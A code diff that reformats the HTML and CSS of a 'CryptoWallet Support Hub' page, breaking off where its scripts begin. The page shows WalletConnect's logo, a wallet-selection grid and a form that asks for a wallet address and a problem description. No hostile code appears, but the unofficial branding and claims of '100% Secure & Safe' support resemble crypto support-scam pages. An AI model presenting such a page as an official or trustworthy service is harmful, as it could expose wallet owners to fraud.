+        min-height: 44px;
+        -webkit-appearance: none !important;
+        -moz-appearance: none !important;
+        appearance: none !important;
+        -webkit-border-radius: 0.5rem;
+        position: relative;
+        z-index: 10;
       }
-    }
 
-    .wallet-card img {
-      max-width: 80%;
-      max-height: 80%;
-      object-fit: contain;
-    }
-
-    .wallet-icon {
-      width: 50%;
-      height: 50%;
-      color: hsl(var(--primary));
-    }
-
-    .tooltip {
-      position: absolute;
-      bottom: -2.5rem;
-      left: 50%;
-      transform: translateX(-50%);
-      background: hsl(var(--card));
-      border: 1px solid hsl(var(--card-border));
-      padding: 0.5rem 0.75rem;
-      border-radius: 0.5rem;
-      font-size: 0.75rem;
-      white-space: nowrap;
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity 0.3s;
-    }
-
-    /* Issues Section - Responsive Grid */
-    .issues-container {
-      display: grid;
-      grid-template-columns: 1fr;
-      gap: 1.2rem;
-      margin-top: 1.5rem;
-    }
-
-    @media (min-width: 768px) {
-      .issues-container {
-        grid-template-columns: 1fr 1fr;
-        gap: 2rem;
+      select {
+        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23666' d='M6 9L1 4h10z'/%3E%3C/svg%3E");
+        background-repeat: no-repeat;
+        background-position: right 0.7rem center;
+        background-size: 1rem;
+        padding-right: 2.5rem;
+        overflow: visible;
       }
-    }
 
-    @media (min-width: 1200px) {
-      .issues-container {
-        gap: 2.5rem;
+      select option {
+        background: hsl(var(--card));
+        color: hsl(var(--foreground));
       }
-    }
 
-    .card {
-      background: hsl(var(--card));
-      border: 1px solid hsl(var(--card-border));
-      border-radius: 0.75rem;
-      padding: 1.5rem;
-    }
-
-    @media (min-width: 768px) {
-      .card {
-        padding: 2rem;
-      }
-    }
-
-    .card h2 {
-      font-size: 1.25rem;
-      margin-bottom: 0.5rem;
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-      word-break: break-word;
-      color: hsl(var(--foreground));
-    }
-
-    @media (min-width: 768px) {
-      .card h2 {
-        font-size: 1.5rem;
-      }
-    }
-
-    .card p {
-      color: hsl(var(--muted-foreground));
-      margin-bottom: 1.5rem;
-      font-size: 0.95rem;
-    }
-
-    .issue-item {
-      padding: 0.75rem;
-      border-radius: 0.5rem;
-      background: hsl(var(--background), 0.5);
-      border: 1px solid hsl(var(--border));
-      margin-bottom: 0.6rem;
-      cursor: pointer;
-      transition: all 0.3s;
-    }
-
-    @media (hover: hover) {
-      .issue-item:hover {
-        background: hsl(var(--primary), 0.05);
+      input:focus,
+      textarea:focus,
+      select:focus {
+        outline: none;
         border-color: hsl(var(--primary));
+        box-shadow: 0 0 0 3px hsl(var(--primary), 0.1);
       }
-    }
 
-    .issue-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: start;
-      margin-bottom: 0.5rem;
-      gap: 0.5rem;
-    }
-
-    .issue-title {
-      font-weight: 600;
-      font-size: 0.95rem;
-    }
-
-    .severity-badge {
-      padding: 0.2rem 0.6rem;
-      border-radius: 0.25rem;
-      font-size: 0.65rem;
-      font-weight: 600;
-      white-space: nowrap;
-      flex-shrink: 0;
-    }
-
-    .severity-critical { background: hsl(var(--destructive), 0.2); color: hsl(var(--destructive)); }
-    .severity-high { background: hsl(12, 100%, 60%, 0.2); color: hsl(12, 100%, 40%); }
-    .severity-medium { background: hsl(45, 100%, 60%, 0.2); color: hsl(45, 100%, 40%); }
-    .severity-low { background: hsl(var(--primary), 0.2); color: hsl(var(--primary)); }
-
-    .solution {
-      margin-top: 0.75rem;
-      padding-top: 0.75rem;
-      border-top: 1px solid hsl(var(--border));
-      font-size: 0.9rem;
-      color: hsl(var(--muted-foreground));
-      display: flex;
-      gap: 0.5rem;
-    }
-
-    .solution-icon {
-      color: #22c55e;
-      flex-shrink: 0;
-      margin-top: 0.2rem;
-    }
-
-    /* Form */
-    .form {
-      display: flex;
-      flex-direction: column;
-      gap: 1.2rem;
-    }
-
-    .form-group {
-      display: flex;
-      flex-direction: column;
-    }
-
-    label {
-      font-weight: 600;
-      margin-bottom: 0.5rem;
-      color: hsl(var(--foreground));
-      font-size: 0.9rem;
-      display: block;
-    }
-
-    input, textarea, select {
-      padding: 0.7rem;
-      border: 1px solid hsl(var(--border));
-      border-radius: 0.5rem;
-      background: hsl(var(--background));
-      color: hsl(var(--foreground));
-      font-family: inherit;
-      font-size: 1rem;
-      transition: all 0.3s;
-      width: 100%;
-      min-height: 44px;
-      -webkit-appearance: none !important;
-      -moz-appearance: none !important;
-      appearance: none !important;
-      -webkit-border-radius: 0.5rem;
-      position: relative;
-      z-index: 10;
-    }
-
-    select {
-      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23666' d='M6 9L1 4h10z'/%3E%3C/svg%3E");
-      background-repeat: no-repeat;
-      background-position: right 0.7rem center;
-      background-size: 1rem;
-      padding-right: 2.5rem;
-      overflow: visible;
-    }
-
-    select option {
-      background: hsl(var(--card));
-      color: hsl(var(--foreground));
-    }
-
-    input:focus, textarea:focus, select:focus {
-      outline: none;
-      border-color: hsl(var(--primary));
-      box-shadow: 0 0 0 3px hsl(var(--primary), 0.1);
-    }
-
-    textarea {
-      resize: vertical;
-      min-height: 110px;
-      padding: 0.75rem;
-    }
-
-    .submit-btn {
-      padding: 0.7rem 1.5rem;
-      border-radius: 0.5rem;
-      background: linear-gradient(135deg, hsl(var(--primary)) 0%, hsl(var(--secondary)) 100%);
-      color: white;
-      font-weight: 600;
-      font-size: 0.95rem;
-      transition: all 0.3s;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.5rem;
-      width: 100%;
-      min-height: 44px;
-      border: none;
-      box-shadow: 0 2px 8px hsl(var(--primary), 0.3);
-    }
-
-    @media (hover: hover) {
-      .submit-btn:hover {
-        transform: translateY(-2px);
-        box-shadow: 0 10px 20px hsl(var(--primary), 0.3);
+      textarea {
+        resize: vertical;
+        min-height: 110px;
+        padding: 0.75rem;
       }
-    }
 
-    .submit-btn:active {
-      transform: scale(0.98);
-    }
-
-    .submit-btn:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-    }
-
-    /* Toast */
-    .toast {
-      position: fixed;
-      bottom: 1rem;
-      right: 1rem;
-      left: 1rem;
-      padding: 1rem;
-      border-radius: 0.5rem;
-      background: hsl(var(--card));
-      border: 1px solid hsl(var(--card-border));
-      box-shadow: 0 10px 30px hsl(0, 0%, 0%, 0.1);
-      animation: slideIn 0.3s ease-out;
-      z-index: 1000;
-      max-width: 500px;
-      margin-left: auto;
-      margin-right: auto;
-    }
-
-    .toast.success { border-left: 4px solid #22c55e; }
-    .toast.error { border-left: 4px solid hsl(var(--destructive)); }
-
-    @keyframes slideIn {
-      from {
-        transform: translateY(400px);
-        opacity: 0;
+      .submit-btn {
+        padding: 0.7rem 1.5rem;
+        border-radius: 0.5rem;
+        background: linear-gradient(
+          135deg,
+          hsl(var(--primary)) 0%,
+          hsl(var(--secondary)) 100%
+        );
+        color: white;
+        font-weight: 600;
+        font-size: 0.95rem;
+        transition: all 0.3s;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.5rem;
+        width: 100%;
+        min-height: 44px;
+        border: none;
+        box-shadow: 0 2px 8px hsl(var(--primary), 0.3);
       }
-      to {
-        transform: translateY(0);
-        opacity: 1;
+
+      @media (hover: hover) {
+        .submit-btn:hover {
+          transform: translateY(-2px);
+          box-shadow: 0 10px 20px hsl(var(--primary), 0.3);
+        }
       }
-    }
 
-    /* Footer - Responsive Design */
-    footer {
-      background: hsl(var(--primary));
-      border-top: 1px solid hsl(var(--primary), 0.8);
-      padding: 2rem 0.75rem 1.5rem;
-      margin-top: 3rem;
-    }
+      .submit-btn:active {
+        transform: scale(0.98);
+      }
 
-    .footer-content {
-      max-width: 1200px;
-      margin: 0 auto;
-      padding: 0 0.5rem;
-    }
+      .submit-btn:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+      }
 
-    .footer-grid {
-      display: grid;
-      grid-template-columns: 1fr;
-      gap: 1.5rem;
-      margin-bottom: 2rem;
-    }
+      /* Toast */
+      .toast {
+        position: fixed;
+        bottom: 1rem;
+        right: 1rem;
+        left: 1rem;
+        padding: 1rem;
+        border-radius: 0.5rem;
+        background: hsl(var(--card));
+        border: 1px solid hsl(var(--card-border));
+        box-shadow: 0 10px 30px hsl(0, 0%, 0%, 0.1);
+        animation: slideIn 0.3s ease-out;
+        z-index: 1000;
+        max-width: 500px;
+        margin-left: auto;
+        margin-right: auto;
+      }
 
-    @media (min-width: 480px) {
-      .footer-grid {
-        grid-template-columns: repeat(3, 1fr);
-        gap: 2rem;
+      .toast.success {
+        border-left: 4px solid #22c55e;
+      }
+      .toast.error {
+        border-left: 4px solid hsl(var(--destructive));
+      }
+
+      @keyframes slideIn {
+        from {
+          transform: translateY(400px);
+          opacity: 0;
+        }
+        to {
+          transform: translateY(0);
+          opacity: 1;
+        }
+      }
+
+      /* Footer - Responsive Design */
+      footer {
+        background: hsl(var(--primary));
+        border-top: 1px solid hsl(var(--primary), 0.8);
+        padding: 2rem 0.75rem 1.5rem;
+        margin-top: 3rem;
       }
 
       .footer-content {
-        padding: 0;
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0 0.5rem;
       }
 
-      footer {
-        padding: 3rem 1rem 2rem;
+      .footer-grid {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 1.5rem;
+        margin-bottom: 2rem;
       }
-    }
 
-    @media (min-width: 768px) {
-      footer {
-        padding: 3rem 1.5rem 2rem;
+      @media (min-width: 480px) {
+        .footer-grid {
+          grid-template-columns: repeat(3, 1fr);
+          gap: 2rem;
+        }
+
+        .footer-content {
+          padding: 0;
+        }
+
+        footer {
+          padding: 3rem 1rem 2rem;
+        }
       }
-    }
 
-    .footer-section {
-      text-align: center;
-      font-size: 0.9rem;
-    }
+      @media (min-width: 768px) {
+        footer {
+          padding: 3rem 1.5rem 2rem;
+        }
+      }
 
-    @media (min-width: 480px) {
       .footer-section {
-        text-align: left;
+        text-align: center;
+        font-size: 0.9rem;
+      }
+
+      @media (min-width: 480px) {
+        .footer-section {
+          text-align: left;
+          font-size: 1rem;
+        }
+      }
+
+      .footer-section p {
+        color: rgba(255, 255, 255, 0.8);
+        font-size: 0.9rem;
+        line-height: 1.6;
+        margin: 0;
+      }
+
+      .footer-title {
         font-size: 1rem;
+        font-weight: 700;
+        color: white;
+        margin-bottom: 0.75rem;
       }
-    }
 
-    .footer-section p {
-      color: rgba(255, 255, 255, 0.8);
-      font-size: 0.9rem;
-      line-height: 1.6;
-      margin: 0;
-    }
-
-    .footer-title {
-      font-size: 1rem;
-      font-weight: 700;
-      color: white;
-      margin-bottom: 0.75rem;
-    }
-
-    .footer-links {
-      list-style: none;
-      padding: 0;
-      margin: 0;
-    }
-
-    .footer-links li {
-      margin-bottom: 0.5rem;
-    }
-
-    .footer-links a {
-      color: rgba(255, 255, 255, 0.8);
-      text-decoration: none;
-      font-size: 0.9rem;
-      transition: all 0.3s;
-    }
-
-    @media (hover: hover) {
-      .footer-links a:hover {
-        color: hsl(var(--primary));
-        padding-left: 0.5rem;
+      .footer-links {
+        list-style: none;
+        padding: 0;
+        margin: 0;
       }
-    }
 
-    .footer-bottom {
-      display: grid;
-      grid-template-columns: 1fr;
-      gap: 1rem;
-      padding-top: 2rem;
-      border-top: 1px solid hsl(var(--border));
-      text-align: center;
-    }
+      .footer-links li {
+        margin-bottom: 0.5rem;
+      }
 
-    @media (min-width: 768px) {
+      .footer-links a {
+        color: rgba(255, 255, 255, 0.8);
+        text-decoration: none;
+        font-size: 0.9rem;
+        transition: all 0.3s;
+      }
+
+      @media (hover: hover) {
+        .footer-links a:hover {
+          color: hsl(var(--primary));
+          padding-left: 0.5rem;
+        }
+      }
+
       .footer-bottom {
-        grid-template-columns: 1fr auto;
-        text-align: left;
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 1rem;
+        padding-top: 2rem;
+        border-top: 1px solid hsl(var(--border));
+        text-align: center;
       }
-    }
 
-    .footer-copyright {
-      font-size: 0.85rem;
-      color: hsl(var(--muted-foreground));
-    }
+      @media (min-width: 768px) {
+        .footer-bottom {
+          grid-template-columns: 1fr auto;
+          text-align: left;
+        }
+      }
 
-    .footer-copyright p {
-      margin: 0;
-    }
+      .footer-copyright {
+        font-size: 0.85rem;
+        color: hsl(var(--muted-foreground));
+      }
 
-    .footer-badge {
-      display: flex;
-      gap: 1rem;
-      flex-wrap: wrap;
-      justify-content: center;
-    }
+      .footer-copyright p {
+        margin: 0;
+      }
 
-    @media (min-width: 768px) {
       .footer-badge {
-        justify-content: flex-end;
+        display: flex;
+        gap: 1rem;
+        flex-wrap: wrap;
+        justify-content: center;
       }
-    }
 
-    .badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.4rem;
-      padding: 0.4rem 0.8rem;
-      background: hsl(var(--primary), 0.1);
-      color: hsl(var(--primary));
-      border-radius: 2rem;
-      font-size: 0.8rem;
-      font-weight: 600;
-      border: 1px solid hsl(var(--primary), 0.2);
-    }
-
-    /* Hidden sections */
-    [data-page] {
-      display: none;
-    }
-
-    [data-page].active {
-      display: block;
-    }
-
-    .back-btn {
-      padding: 0.5rem 1rem;
-      background: hsl(var(--card));
-      border: 1px solid hsl(var(--card-border));
-      border-radius: 0.5rem;
-      color: hsl(var(--foreground));
-      margin-bottom: 1rem;
-      transition: all 0.3s;
-      font-size: 0.95rem;
-      min-height: 40px;
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-    }
-
-    @media (hover: hover) {
-      .back-btn:hover {
-        background: hsl(var(--muted));
+      @media (min-width: 768px) {
+        .footer-badge {
+          justify-content: flex-end;
+        }
       }
-    }
 
-    .back-btn:active {
-      transform: scale(0.98);
-    }
-
-    /* Preloader */
-    .preloader {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: hsl(var(--background));
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-      animation: fadeOut 0.6s ease-in-out forwards;
-      animation-delay: 3s;
-    }
-
-    .preloader.hidden {
-      display: none;
-    }
-
-    .preloader-content {
-      text-align: center;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 2rem;
-    }
-
-    .preloader-image {
-      width: 120px;
-      height: 120px;
-      border-radius: 1rem;
-      box-shadow: 0 10px 40px hsl(var(--primary), 0.2);
-      animation: pulse 1.5s ease-in-out infinite;
-    }
-
-    .preloader-text {
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: hsl(var(--primary));
-      letter-spacing: 0.5px;
-    }
-
-    @keyframes fadeOut {
-      from {
-        opacity: 1;
-        pointer-events: auto;
+      .badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.4rem;
+        padding: 0.4rem 0.8rem;
+        background: hsl(var(--primary), 0.1);
+        color: hsl(var(--primary));
+        border-radius: 2rem;
+        font-size: 0.8rem;
+        font-weight: 600;
+        border: 1px solid hsl(var(--primary), 0.2);
       }
-      to {
-        opacity: 0;
-        pointer-events: none;
-      }
-    }
 
-    @keyframes pulse {
-      0%, 100% {
-        transform: scale(1);
+      /* Hidden sections */
+      [data-page] {
+        display: none;
       }
-      50% {
-        transform: scale(1.05);
+
+      [data-page].active {
+        display: block;
       }
-    }
-  </style>
-</head>
-<body>
-  <!-- Preloader -->
-  <div class="preloader" id="preloader">
-    <div class="preloader-content">
-      <img src="https://droomdroom.com/wp-content/uploads/2023/11/wallet-connect-615x410.jpeg" alt="Loading..." class="preloader-image">
-      <div class="preloader-text">Loading...</div>
-    </div>
-  </div>
-  <!-- Header -->
-  <header>
-    <div class="header-content">
-      <div class="logo-section">
-        <a href="#" class="logo" onclick="goToHome(); return false;">
-          <div class="logo-icon"><i class="fas fa-wallet"></i></div>
-          <div class="logo-text">
-            <div class="logo-title">CryptoWallet</div>
-            <div class="logo-subtitle">Support Hub</div>
-          </div>
-        </a>
-        <img src="https://images.prismic.io/wallet-connect/65779a69531ac2845a25ec6c_WalletConnect-App-Logo-1024X1024.png?auto=format%2Ccompress&fit=max&w=2048" alt="WalletConnect Logo" class="wc-logo">
-      </div>
-      <div class="nav-buttons">
-        <div class="nav-tabs">
-          <button class="nav-btn active" onclick="navigateTo('home'); return false;">
-            <i class="fas fa-th"></i> <span data-i18n="nav.browse">Browse</span>
-          </button>
-          <button class="nav-btn" onclick="navigateTo('issues'); return false;">
-            <i class="fas fa-headset"></i> <span data-i18n="nav.support">Support</span>
-          </button>
-        </div>
-        <div class="language-switcher">
-          <select id="languageSelect" onchange="changeLanguage(this.value); return false;">
-            <option value="en">🇺🇸 English</option>
-            <option value="es">🇪🇸 Español</option>
-            <option value="fr">🇫🇷 Français</option>
-            <option value="de">🇩🇪 Deutsch</option>
-            <option value="zh">🇨🇳 中文</option>
-            <option value="ja">🇯🇵 日本語</option>
-          </select>
-        </div>
-        <button class="theme-toggle" onclick="toggleTheme(); return false;" title="Toggle dark mode">
-          <i class="fas fa-moon"></i>
-        </button>
+
+      .back-btn {
+        padding: 0.5rem 1rem;
+        background: hsl(var(--card));
+        border: 1px solid hsl(var(--card-border));
+        border-radius: 0.5rem;
+        color: hsl(var(--foreground));
+        margin-bottom: 1rem;
+        transition: all 0.3s;
+        font-size: 0.95rem;
+        min-height: 40px;
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+      }
+
+      @media (hover: hover) {
+        .back-btn:hover {
+          background: hsl(var(--muted));
+        }
+      }
+
+      .back-btn:active {
+        transform: scale(0.98);
+      }
+
+      /* Preloader */
+      .preloader {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: hsl(var(--background));
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+        animation: fadeOut 0.6s ease-in-out forwards;
+        animation-delay: 3s;
+      }
+
+      .preloader.hidden {
+        display: none;
+      }
+
+      .preloader-content {
+        text-align: center;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 2rem;
+      }
+
+      .preloader-image {
+        width: 120px;
+        height: 120px;
+        border-radius: 1rem;
+        box-shadow: 0 10px 40px hsl(var(--primary), 0.2);
+        animation: pulse 1.5s ease-in-out infinite;
+      }
+
+      .preloader-text {
+        font-size: 1.2rem;
+        font-weight: 600;
+        color: hsl(var(--primary));
+        letter-spacing: 0.5px;
+      }
+
+      @keyframes fadeOut {
+        from {
+          opacity: 1;
+          pointer-events: auto;
+        }
+        to {
+          opacity: 0;
+          pointer-events: none;
+        }
+      }
+
+      @keyframes pulse {
+        0%,
+        100% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.05);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Preloader -->
+    <div class="preloader" id="preloader">
+      <div class="preloader-content">
+        <img
+          src="https://droomdroom.com/wp-content/uploads/2023/11/wallet-connect-615x410.jpeg"
+          alt="Loading..."
+          class="preloader-image"
+        />
+        <div class="preloader-text">Loading...</div>
       </div>
     </div>
-  </header>
-
-  <!-- Home Page -->
-  <div data-page="home" class="active">
-    <div class="container">
-      <div class="hero">
-        <h1 data-i18n="home.title">Connect Your Wallet</h1>
-        <p data-i18n="home.subtitle">Get instant support for 114+ cryptocurrency wallets</p>
-        <p style="color: hsl(var(--muted-foreground));" data-i18n="home.description">Select your wallet provider to access secure resources and community support</p>
-      </div>
-
-      <div class="stats">
-        <div class="stat">
-          <div class="stat-value">114+</div>
-          <div class="stat-label" data-i18n="home.stat1">Wallets Supported</div>
-        </div>
-        <div class="stat">
-          <div class="stat-value">24/7</div>
-          <div class="stat-label" data-i18n="home.stat2">Community Help</div>
-        </div>
-        <div class="stat">
-          <div class="stat-value">100%</div>
-          <div class="stat-label" data-i18n="home.stat3">Secure & Safe</div>
-        </div>
-      </div>
-
-      <div class="search-container">
-        <input 
-          type="search" 
-          class="search-input" 
-          id="searchInput" 
-          placeholder="Search wallets..."
-          data-i18n-placeholder="home.search"
-          onkeyup="filterWallets(); return false;"
-        >
-      </div>
-
-      <div>
-        <h2 style="font-size: 1.5rem; margin-bottom: 1rem;" data-i18n="home.chooseWallet">Choose Your Wallet</h2>
-        <div class="wallets-grid" id="walletsGrid">
-          <!-- Wallets populated by JavaScript -->
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- Issues Page -->
-  <div data-page="issues">
-    <div class="container">
-      <button class="back-btn" onclick="navigateTo('home'); return false;">
-        <i class="fas fa-arrow-left"></i> <span data-i18n="issues.back">Back to Wallets</span>
-      </button>
-
-      <div class="hero">
-        <h1 data-i18n="issues.title">Crypto Issues Support</h1>
-        <p data-i18n="issues.subtitle">Get help with common crypto wallet problems and submit your issues</p>
-      </div>
-
-      <div class="issues-container">
-        <!-- Common Issues -->
-        <div class="card">
-          <h2><i class="fas fa-exclamation-circle" style="color: hsl(var(--primary));"></i> <span data-i18n="issues.commonIssues">Common Issues</span></h2>
-          <p data-i18n="issues.description">Quick solutions for frequent crypto problems</p>
-          <div id="issuesList">
-            <!-- Issues populated by JavaScript -->
-          </div>
-        </div>
-
-        <!-- Submit Form -->
-        <div class="card">
-          <h2><i class="fas fa-envelope" style="color: hsl(var(--primary));"></i> <span data-i18n="issues.submitForm">Submit Your Issue</span></h2>
-          <p data-i18n="issues.submitDescription">Describe your problem and we'll help you resolve it</p>
-          <form class="form" onsubmit="submitIssue(event); return false;">
-            <div class="form-group">
-              <label for="walletAddress" data-i18n="issues.walletLabel">Wallet Address (Optional)</label>
-              <input type="text" id="walletAddress" placeholder="0x..." />
+    <!-- Header -->
+    <header>
+      <div class="header-content">
+        <div class="logo-section">
+          <a href="#" class="logo" onclick="goToHome(); return false;">
+            <div class="logo-icon"><i class="fas fa-wallet"></i></div>
+            <div class="logo-text">
+              <div class="logo-title">CryptoWallet</div>
+              <div class="logo-subtitle">Support Hub</div>
             </div>
-
-            <div class="form-group">
-              <label for="issueType" data-i18n="issues.issueTypeLabel">Issue Type</label>
-              <select id="issueType" required>
-                <option value="" data-i18n="issues.selectIssue">Select an issue...</option>
-              </select>
-            </div>
-
-            <div class="form-group">
-              <label for="issueDescription" data-i18n="issues.descriptionLabel">Description</label>
-              <textarea id="issueDescription" placeholder="Describe your issue..." data-i18n-placeholder="issues.descriptionPlaceholder" required></textarea>
-            </div>
-
-            <button type="submit" class="submit-btn" id="submitBtn">
-              <i class="fas fa-paper-plane"></i> <span data-i18n="issues.submitBtn">Submit Issue</span>
+          </a>
+          <img
+            src="https://images.prismic.io/wallet-connect/65779a69531ac2845a25ec6c_WalletConnect-App-Logo-1024X1024.png?auto=format%2Ccompress&fit=max&w=2048"
+            alt="WalletConnect Logo"
+            class="wc-logo"
+          />
+        </div>
+        <div class="nav-buttons">
+          <div class="nav-tabs">
+            <button
+              class="nav-btn active"
+              onclick="navigateTo('home'); return false;"
+            >
+              <i class="fas fa-th"></i>
+              <span data-i18n="nav.browse">Browse</span>
             </button>
-          </form>
+            <button
+              class="nav-btn"
+              onclick="navigateTo('issues'); return false;"
+            >
+              <i class="fas fa-headset"></i>
+              <span data-i18n="nav.support">Support</span>
+            </button>
+          </div>
+          <div class="language-switcher">
+            <select
+              id="languageSelect"
+              onchange="changeLanguage(this.value); return false;"
+            >
+              <option value="en">🇺🇸 English</option>
+              <option value="es">🇪🇸 Español</option>
+              <option value="fr">🇫🇷 Français</option>
+              <option value="de">🇩🇪 Deutsch</option>
+              <option value="zh">🇨🇳 中文</option>
+              <option value="ja">🇯🇵 日本語</option>
+            </select>
+          </div>
+          <button
+            class="theme-toggle"
+            onclick="toggleTheme(); return false;"
+            title="Toggle dark mode"
+          >
+            <i class="fas fa-moon"></i>
+          </button>
+        </div>
+      </div>
+    </header>
+
+    <!-- Home Page -->
+    <div data-page="home" class="active">
+      <div class="container">
+        <div class="hero">
+          <h1 data-i18n="home.title">Connect Your Wallet</h1>
+          <p data-i18n="home.subtitle">
+            Get instant support for 114+ cryptocurrency wallets
+          </p>
+          <p
+            style="color: hsl(var(--muted-foreground))"
+            data-i18n="home.description"
+          >
+            Select your wallet provider to access secure resources and community
+            support
+          </p>
+        </div>
+
+        <div class="stats">
+          <div class="stat">
+            <div class="stat-value">114+</div>
+            <div class="stat-label" data-i18n="home.stat1">
+              Wallets Supported
+            </div>
+          </div>
+          <div class="stat">
+            <div class="stat-value">24/7</div>
+            <div class="stat-label" data-i18n="home.stat2">Community Help</div>
+          </div>
+          <div class="stat">
+            <div class="stat-value">100%</div>
+            <div class="stat-label" data-i18n="home.stat3">Secure & Safe</div>
+          </div>
+        </div>
+
+        <div class="search-container">
+          <input
+            type="search"
+            class="search-input"
+            id="searchInput"
+            placeholder="Search wallets..."
+            data-i18n-placeholder="home.search"
+            onkeyup="filterWallets(); return false;"
+          />
+        </div>
+
+        <div>
+          <h2
+            style="font-size: 1.5rem; margin-bottom: 1rem"
+            data-i18n="home.chooseWallet"
+          >
+            Choose Your Wallet
+          </h2>
+          <div class="wallets-grid" id="walletsGrid">
+            <!-- Wallets populated by JavaScript -->
+          </div>
         </div>
       </div>
     </div>
-  </div>
 
-  <!-- Footer -->
-  <footer>
-    <div class="footer-content">
-      <div class="footer-grid">
-        <div class="footer-section">
-          <h3 class="footer-title" data-i18n="footer.about">About</h3>
-          <p data-i18n="footer.aboutDesc">Your trusted guide for resolving cryptocurrency wallet issues and getting instant support for 114+ wallets.</p>
+    <!-- Issues Page -->
+    <div data-page="issues">
+      <div class="container">
+        <button class="back-btn" onclick="navigateTo('home'); return false;">
+          <i class="fas fa-arrow-left"></i>
+          <span data-i18n="issues.back">Back to Wallets</span>
+        </button>
+
+        <div class="hero">
+          <h1 data-i18n="issues.title">Crypto Issues Support</h1>
+          <p data-i18n="issues.subtitle">
+            Get help with common crypto wallet problems and submit your issues
+          </p>
         </div>
-        <div class="footer-section">
-          <h3 class="footer-title" data-i18n="footer.links">Quick Links</h3>
-          <ul class="footer-links">
-            <li><a href="#" onclick="navigateTo('home'); return false;" data-i18n="footer.browseWallets">Browse Wallets</a></li>
-            <li><a href="#" onclick="navigateTo('issues'); return false;" data-i18n="footer.getHelp">Get Help</a></li>
-            <li><a href="#" onclick="toggleTheme(); return false;" data-i18n="footer.toggleTheme">Toggle Theme</a></li>
-          </ul>
-        </div>
-        <div class="footer-section">
-          <h3 class="footer-title" data-i18n="footer.support">Support</h3>
-          <p data-i18n="footer.supportDesc">24/7 Community support for all your crypto wallet needs. Submit issues and get help from our team.</p>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <div class="footer-copyright">
-          <p data-i18n="footer.copyright">&copy; 2024 Crypto Wallet Support Hub. All rights reserved.</p>
-        </div>
-        <div class="footer-badge">
-          <span class="badge">
-            <i class="fas fa-shield-alt"></i> <span data-i18n="footer.secure">Secure & Safe</span>
-          </span>
-          <span class="badge">
-            <i class="fas fa-globe"></i> <span data-i18n="footer.global">Global Support</span>
-          </span>
+
+        <div class="issues-container">
+          <!-- Common Issues -->
+          <div class="card">
+            <h2>
+              <i
+                class="fas fa-exclamation-circle"
+                style="color: hsl(var(--primary))"
+              ></i>
+              <span data-i18n="issues.commonIssues">Common Issues</span>
+            </h2>
+            <p data-i18n="issues.description">
+              Quick solutions for frequent crypto problems
+            </p>
+            <div id="issuesList">
+              <!-- Issues populated by JavaScript -->
+            </div>
+          </div>
+
+          <!-- Submit Form -->
+          <div class="card">
+            <h2>
+              <i class="fas fa-envelope" style="color: hsl(var(--primary))"></i>
+              <span data-i18n="issues.submitForm">Submit Your Issue</span>
+            </h2>
+            <p data-i18n="issues.submitDescription">
+              Describe your problem and we'll help you resolve it
+            </p>
+            <form class="form" onsubmit="submitIssue(event); return false;">
+              <div class="form-group">
+                <label for="walletAddress" data-i18n="issues.walletLabel"
+                  >Wallet Address (Optional)</label
+                >
+                <input type="text" id="walletAddress" placeholder="0x..." />
+              </div>
+
+              <div class="form-group">
+                <label for="issueType" data-i18n="issues.issueTypeLabel"
+                  >Issue Type</label
+                >
+                <select id="issueType" required>
+                  <option value="" data-i18n="issues.selectIssue">
+                    Select an issue...
+                  </option>
+                </select>
+              </div>
+
+              <div class="form-group">
+                <label
+                  for="issueDescription"
+                  data-i18n="issues.descriptionLabel"
+                  >Description</label
+                >
+                <textarea
+                  id="issueDescription"
+                  placeholder="Describe your issue..."
+                  data-i18n-placeholder="issues.descriptionPlaceholder"
+                  required
+                ></textarea>
+              </div>
+
+              <button type="submit" class="submit-btn" id="submitBtn">
+                <i class="fas fa-paper-plane"></i>
+                <span data-i18n="issues.submitBtn">Submit Issue</span>
+              </button>
+            </form>
+          </div>
         </div>
       </div>
     </div>
-  </footer>
 
-  <script>
-    // i18n Translations
-    const TRANSLATIONS = {
-      en: {
-        nav: { browse: "Browse", support: "Support" },
-        home: {
-          title: "Connect Your Wallet",
-          subtitle: "Get instant support for 114+ cryptocurrency wallets",
-          description: "Select your wallet provider to access secure resources and community support",
-          stat1: "Wallets Supported",
-          stat2: "Community Help",
-          stat3: "Secure & Safe",
-          search: "Search wallets...",
-          chooseWallet: "Choose Your Wallet"
+    <!-- Footer -->
+    <footer>
+      <div class="footer-content">
+        <div class="footer-grid">
+          <div class="footer-section">
+            <h3 class="footer-title" data-i18n="footer.about">About</h3>
+            <p data-i18n="footer.aboutDesc">
+              Your trusted guide for resolving cryptocurrency wallet issues and
+              getting instant support for 114+ wallets.
+            </p>
+          </div>
+          <div class="footer-section">
+            <h3 class="footer-title" data-i18n="footer.links">Quick Links</h3>
+            <ul class="footer-links">
+              <li>
+                <a
+                  href="#"
+                  onclick="navigateTo('home'); return false;"
+                  data-i18n="footer.browseWallets"
